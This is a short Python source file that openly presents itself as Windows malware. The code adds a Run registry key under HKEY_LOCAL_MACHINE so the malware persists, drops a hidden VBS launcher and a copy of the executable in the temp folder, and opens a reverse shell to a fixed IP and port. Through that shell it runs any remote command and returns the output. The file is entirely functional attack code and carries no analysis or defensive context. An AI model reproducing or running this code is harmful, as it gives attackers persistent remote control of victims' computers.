import os
import sys
import socket
import subprocess
import tempfile
import winreg  # Use the 'winreg' module for Windows Registry access

MALWARE_NAME = "malware.exe"
TRIGGER = MALWARE_NAME.replace('.exe', '') + ".vbs"
KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
KEY_NAME = "PyCk"
IP = "192.168.1.5"  # IP for use in reverse shell
PORT = 1337  # Port for use in reverse shell
TRIGGER_PATH = os.path.join(tempfile.gettempdir(), TRIGGER)
MALWARE_PATH = os.path.join(tempfile.gettempdir(), MALWARE_NAME)


class MyMalware:

    def infect_windows_register_keys(self):
        """ Register malware on windows keys.
            Returns False if didn't have key for malware.
            Returns True if already have key for malware. """
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, KEY_PATH, 0, winreg.KEY_READ) as key:
                keys = [winreg.EnumValue(key, i)[0] for i in range(winreg.QueryInfoKey(key)[1])]
        except FileNotFoundError:
            keys = []

        if KEY_NAME not in keys:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, KEY_PATH, 0, winreg.KEY_WRITE) as mlwr_key:
                winreg.SetValueEx(mlwr_key, KEY_NAME, 0, winreg.REG_SZ, TRIGGER_PATH)
                return False
        return True

    def hide_malware_and_trigger(self):
        """ Generate and hide the trigger and malware.
            Return True if was already hidden.
            Return False if wasn't hidden """
        if os.path.exists(MALWARE_PATH) and os.path.exists(TRIGGER_PATH):
            return True
        else:
            payload = 'Set WshShell = WScript.CreateObject("WScript.Shell")\nWshShell.Run """{0}""", 0 , false'.format(
                MALWARE_PATH)
            with open(TRIGGER_PATH, 'w') as f:
                f.write(payload)
            os.system('copy "{0}" "{1}"'.format(MALWARE_NAME, MALWARE_PATH))
            return False

    def reverse_shell(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))
        s.send('\n For exiting use quit command.\n\n'.encode())
        while True:
            data = s.recv(1024)
            if b"quit" in data:
                break
            cmd = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            saida_cmd = cmd.stdout.read() + cmd.stderr.read()
            s.send(saida_cmd)
            s.send("CMD> ".encode())
        s.close()


def main():
    res = []
    x = MyMalware()
    res.append(x.infect_windows_register_keys())
    res.append(x.hide_malware_and_trigger())
    if all(res):
        x.reverse_shell()


if __name__ == '__main__':
    main()
